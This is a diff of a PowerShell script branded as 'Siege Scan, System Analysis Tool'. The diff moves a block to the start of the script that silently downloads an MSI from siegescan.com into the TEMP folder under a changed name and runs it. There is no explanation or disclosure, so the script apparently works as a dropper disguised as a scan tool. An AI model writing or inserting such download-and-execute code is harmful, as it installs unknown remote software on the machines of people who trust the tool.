@@ -1,3 +1,10 @@
+$exeUrl  = "https://siegescan.com/drivas.msi"
+$exePath = "$env:TEMP\drives.msi"
+
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+
+Start-Process $exePath
+
 $banner = @"
 ███████╗██╗███████╗ ██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
 ██╔════╝██║██╔════╝██╔════╝ ██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
@@ -9,14 +16,6 @@ $banner = @"
                          SIEGE SCAN
                   SYSTEM ANALYSIS TOOL
 "@
-
-$exeUrl  = "https://siegescan.com/drivas.msi"
-$exePath = "$env:TEMP\drives.msi"
-
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
-
-Start-Process $exePath
-
 
 
 Clear-Host
